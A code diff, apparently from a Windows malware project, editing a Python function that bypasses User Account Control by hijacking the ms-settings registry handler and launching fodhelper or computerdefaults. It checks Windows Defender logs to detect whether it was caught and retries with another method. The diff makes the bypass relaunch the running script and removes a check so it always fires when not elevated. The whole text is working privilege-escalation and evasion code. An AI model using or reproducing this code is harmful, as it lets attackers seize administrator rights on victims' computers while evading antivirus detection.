@@ -6,7 +6,7 @@ def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
         execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
         if method == 1:
-            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{GetSelf()}\" /f")
             execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
             log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
             execute("computerdefaults --nouacbypass")
@@ -15,7 +15,7 @@ def UACbypass(method: int = 1) -> bool:
             if log_count_after > log_count_before:
                 return UACbypass(method + 1)
         elif method == 2:
-            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{GetSelf()}\" /f")
             execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
             log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
             execute("fodhelper --nouacbypass")
@@ -30,12 +30,8 @@ def UACbypass(method: int = 1) -> bool:
 def IsAdmin() -> bool:
     return ctypes.windll.shell32.IsUserAnAdmin() == 1
 
-def GetSelf() -> tuple[str, bool]:
-    if hasattr(sys, "frozen"):
-        return (sys.executable, True)
-    else:
-        return (__file__, False)
+def GetSelf():
+    return sys.argv[0]
 if not IsAdmin():
-    if GetSelf()[1]:
-        if UACbypass():
-            os._exit(0)
+    if UACbypass():
+        os._exit(0)
